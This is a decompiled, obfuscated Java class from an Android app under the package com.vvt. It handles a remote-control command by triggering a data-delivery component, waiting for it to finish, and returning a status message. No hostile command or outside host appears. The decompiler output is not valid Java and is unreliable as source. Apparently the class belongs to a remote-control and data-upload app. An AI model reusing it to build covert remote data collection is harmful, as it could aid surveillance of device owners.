package com.vvt.appengine.a;

import android.os.ConditionVariable;

import com.vvt.appengine.AppEngine1;
import com.vvt.datadeliverymanager.b;
import com.vvt.datadeliverymanager.i;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import com.vvt.temporalcontrol.d;

public class bt
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private ConditionVariable c;
  private com.vvt.datadeliverymanager.a.a d;
  private RmtCtrlOutputStatusMessage e;
  
  public bt()
  {
    Object localObject = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    ((RmtCtrlOutputStatusMessage)localObject).<init>();
    this.e = ((RmtCtrlOutputStatusMessage)localObject);
    localObject = b();
    this.d = ((com.vvt.datadeliverymanager.a.a)localObject);
  }
  
  private com.vvt.datadeliverymanager.a.a b()
  {
    bu localbu = new com/vvt/appengine/a/bu;
    localbu.<init>(this);
    return localbu;
  }
  
  public RmtCtrlOutputStatusMessage a(AppEngine1 paramh)
  {
    boolean bool2;
    Object localObject4;
    try
    {
      boolean bool1 = a;
      if (bool1) {}
      Object localObject1 = new android/os/ConditionVariable;
      bool2 = false;
      localObject4 = null;
      ((ConditionVariable)localObject1).<init>(false);
      this.c = ((ConditionVariable)localObject1);
      try
      {
        localObject1 = paramh.al;
        localObject4 = this.d;
        ((d)localObject1).a((com.vvt.datadeliverymanager.a.a)localObject4);
        localObject1 = paramh.al;
        localObject4 = paramh.g;
        ((d)localObject1).a((b)localObject4);
        localObject1 = this.c;
        ((ConditionVariable)localObject1).block();
      }
      catch (Exception localException)
      {
        for (;;)
        {
          bool2 = b;
          if (bool2) {}
          localObject4 = this.e;
          ((RmtCtrlOutputStatusMessage)localObject4).setSuccess(false);
          localObject4 = this.e;
          Object localObject2 = localException.getMessage();
          ((RmtCtrlOutputStatusMessage)localObject4).setMessage((String)localObject2);
          localObject2 = this.c;
          ((ConditionVariable)localObject2).open();
        }
      }
      bool1 = a;
      if (bool1) {}
      localObject1 = this.e;
      return (RmtCtrlOutputStatusMessage)localObject1;
    }
    finally {}
  }
  
  void a(i parami)
  {
    synchronized (this.e)
    {
      RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage2 = this.e;
      boolean bool = parami.f();
      localRmtCtrlOutputStatusMessage2.setSuccess(bool);
      localRmtCtrlOutputStatusMessage2 = this.e;
      String str = parami.e();
      localRmtCtrlOutputStatusMessage2.setMessage(str);
      return;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bt.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */